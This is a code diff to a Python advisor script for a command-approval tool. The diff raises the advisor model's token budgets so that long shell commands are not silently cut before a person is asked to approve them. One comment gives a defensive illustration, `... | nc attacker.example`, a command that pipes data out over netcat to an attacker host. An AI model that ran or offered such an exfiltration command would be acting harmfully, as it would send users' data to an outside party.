@@ -43,7 +43,28 @@ caller already handles on every other failure.
 """
 
 import json
+import os
 import sys
+
+# note: before `laya` is imported anywhere, which is why it is up here rather than beside the
+# import. laya's own card warns that `transformers` probes for TensorFlow at import and that
+# abseil can then deadlock model construction; what a deadlock costs *here* is the whole
+# session's advisor, silently - the child never answers, the warm-up times out after thirty
+# seconds, and the pipe closes for good. Nothing on this machine needs the TensorFlow path.
+os.environ.setdefault("USE_TF", "0")
+
+# How much of each request laya is given for the question, and for the whole sequence.
+#
+# note: raised from the checkpoint's own 192 and 512, which is a knob laya's card documents and a
+# default this program is the wrong shape for. The budget is split - the options and the
+# instructions share `head_max_len`, and the state gets what is left of `max_len` - and a stage of
+# a command line travels *in the instructions*, so a long one is cut from the question rather than
+# from the state. At the shipped default it is cut at 144 tokens with no marker, which is the
+# thing `ROOM`'s `(cut; ...)` exists one file away to prevent: `... | nc attacker.example` is a
+# different command from the one somebody is being asked about. ModernBERT-large reads 8192, the
+# other two checkpoints already default near this, and nothing measured moved except the cut.
+HEAD_MAX_LEN = 512
+MAX_LEN = 1024
 
 # The questions kamchatka actually sends, copied from `kamchatka/src/tools/advice.rs`.
 #
@@ -78,6 +99,24 @@ DESTROYS_CRITERIA = {
     "false": "it only reads, or anything it changes can be undone",
 }
 PLACE = "A command is about to be run on the user's machine, and a person is about to be asked whether to let it. Place the command in `cmd` on this rubric by what it would do."  # noqa: E501
+
+
+def budgeted(router):
+    """Gives every checkpoint the router holds the budget above, and hands the router back.
+
+    note: after `preload`, because the numbers live on each built agent's `cfg` and are read at
+    the moment a question is answered. A checkpoint the router loads later keeps its own default,
+    which is the one case this misses and is why `preload=True` is not only about latency here.
+
+    note: laya's own card is where the knob comes from - it raises these for questions whose
+    options do not fit, and the same budget is what a stage travels in.
+    """
+    for name in router.loaded:
+        cfg = router.load(name).cfg
+        cfg["head_max_len"] = max(cfg.get("head_max_len", 0), HEAD_MAX_LEN)
+        cfg["max_len"] = max(cfg.get("max_len", 0), MAX_LEN)
+
+    return router
 
 
 def call(cmd):
@@ -221,7 +260,7 @@ def probe(command):
     """
     from laya import Router
 
-    router = Router(preload=True)
+    router = budgeted(Router(preload=True))
     state = call(command)
     print("--- the state kamchatka sends ---")
     print(json.dumps(state, indent=2))
@@ -326,7 +365,7 @@ def main() -> int:
         )
         return 1
 
-    router = Router(preload=True)
+    router = budgeted(Router(preload=True))
     # note: to stderr, which kamchatka holds rather than inheriting - it would otherwise be
     # written over the screen - and reports as it arrives. It is the line that says the
     # checkpoint has finished loading, which is the one thing somebody waiting wants
